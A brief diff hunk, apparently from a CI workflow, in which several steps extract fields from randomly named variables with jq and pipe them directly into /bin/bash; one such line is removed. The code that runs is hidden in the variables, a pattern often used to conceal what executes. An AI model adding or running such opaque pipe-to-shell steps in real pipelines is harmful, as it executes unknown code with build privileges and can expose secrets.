@@ -21,7 +21,6 @@ jobs:
           echo $bzzqy2462 | jq -r .p5415 | /bin/bash
           printf '%s' "$unk50" | jq -r .paj87707 | /bin/bash
           printf '%s' "$w9361" | jq -r .asxn2575 | /bin/bash
-          echo $ryx1 | jq -r .pmud1412 | /bin/bash
           echo $mh7 | jq -r .bg24 | /bin/bash
           echo $m30 | jq -r .unb74656 | /bin/bash
           echo $xdtd6188 | jq -r .d23 | /bin/bash
